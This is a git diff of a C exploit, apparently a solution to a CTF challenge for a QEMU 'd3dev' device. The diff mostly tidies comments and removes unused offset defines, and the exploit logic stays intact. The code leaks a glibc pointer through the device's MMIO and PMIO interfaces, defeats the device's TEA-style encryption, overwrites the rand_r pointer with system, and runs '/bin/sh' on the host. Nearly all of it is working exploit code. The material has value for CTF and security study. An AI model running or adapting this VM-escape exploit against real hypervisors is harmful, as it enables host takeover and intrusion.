@@ -11,11 +11,6 @@
 
 #define libc_system_offset 0x55410
 #define libc_rand_r_offset 0x4aeb0
-#define libc_binsh_offset  0x1b75aa
-#define libc_rand_offset 0x4ae90
-#define one_gadget_0_offset 0xe6e73
-#define one_gadget_1_offset 0xe6e76
-#define one_gadget_2_offset 0xe6e79
 
 const uint32_t mmio_phy_base = 0xfebf1000;
 const uint32_t mmio_mem_size = 0x800;
@@ -32,28 +27,29 @@ int die(const char *err_info){
     exit(-1);
 }
 
-// ENCRYPT/DECRYPT
+// ENCRYPT
 static void d3dev_encrypt (uint32_t* v, uint32_t* k) {
-    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */
-    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
-    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
-    for (i=0; i < 32; i++) {                       /* basic cycle start */
+    uint32_t v0=v[0], v1=v[1], sum=0, i;         
+    uint32_t delta=0x9e3779b9;                    
+    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   
+    for (i=0; i < 32; i++) {                    
         sum += delta;
         v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
         v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);  
-    }                                              /* end cycle */
+    }                                            
     v[0]=v0; v[1]=v1;
 }
 
+//DECRYPT
 static void d3dev_decrypt (uint32_t* v, uint32_t* k) {
-    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */
-    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
-    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
-    for (i=0; i<32; i++) {                         /* basic cycle start */
+    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; 
+    uint32_t delta=0x9e3779b9;                   
+    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];  
+    for (i=0; i<32; i++) {                         
         v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
         v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
         sum -= delta;                                   
-    }                                              /* end cycle */
+    }                                             
     v[0]=v0; v[1]=v1;
 }
 
@@ -101,19 +97,13 @@ uint32_t pmio_read(uint32_t addr){
     inl(pmio_phy_base+addr);
 }
 
-
-
-
 int main(){
     puts("[+] Exploit.");
-    //init mmio & pmio
     init_mmio();
     init_pmio();
     
-    //Step 1: Glibc address leak
-    printf("[*] Set memory mode to 'RW'.\n");
-    pmio_write(0x0, 1); // set memory mode RW
-
+    //Step 1
+    pmio_write(0x0, 1); 
     printf("[*] CLR Key.\n");
     pmio_write(0x4, 0); // CLR key
     
@@ -123,7 +113,7 @@ int main(){
     uint64_t glibc_randr;
     uint32_t key[4] = {0};
 
-    //Step 2: Get system addr
+    //Step 2
     glibc_randr = mmio_read(0x18);
     d3dev_encrypt((uint32_t *)&glibc_randr, (uint32_t *)key);
     printf("[*] rand_r@glibc %#lx.\n", glibc_randr);
@@ -134,13 +124,13 @@ int main(){
     printf("[+] Libc base: %#lx.\n", libc_base);
     printf("[+] system@glibc: %#lx.\n", glibc_system);
     
-    //Step 3: Write ptr back
+    //Step 3
     uint64_t glibc_system_encrypt = glibc_system;
     d3dev_decrypt((uint32_t *)&glibc_system_encrypt, (uint32_t *)key);
     printf("[*] Overwrite rand_r ptr.\n");
     mmio_write(0x18, glibc_system_encrypt);
 
-    //Step 4: Write cmd
+    //Step 4
     char cmd[9] = "/bin/sh\x00"; // 8 chars
     printf("[*] Load command: '%s'.\n", cmd);
     uint64_t cmd_encrypt = *(uint64_t *)cmd;
@@ -151,6 +141,7 @@ int main(){
     printf("[*] Write command.\n");
     mmio_write(0x0, cmd_encrypt);
 
+    //Step 5
     printf("[*] Result of `system('%s')`:\n", cmd);
     pmio_write(0x1c, 0x20202020); // 4 spaces padding
 
